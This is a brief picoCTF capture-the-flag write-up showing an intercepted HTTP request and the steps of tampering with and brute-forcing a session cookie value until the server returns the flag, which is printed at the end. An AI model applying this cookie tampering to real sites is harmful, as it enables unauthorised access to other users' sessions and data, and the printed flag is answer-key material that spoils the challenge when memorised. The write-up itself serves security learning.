# Solution

- Burpsuite and `intercept` the request of checking.

```bash
GET /check HTTP/1.1
Host: mercury.picoctf.net:64944
Content-Length: 18
Cache-Control: max-age=0
Origin: http://mercury.picoctf.net:64944
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.9
Referer: http://mercury.picoctf.net:64944/
Accept-Encoding: gzip, deflate, br
Cookie: name= 1
Connection: keep-alive

name=snickerdoodle
```

- Change `Cookie: name= 1` to `Cookie: name= 2` you will see a different response.
- Brute force `Cookie: name`
- You will get at  `Cookie: name= 18`
- `picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}`

---
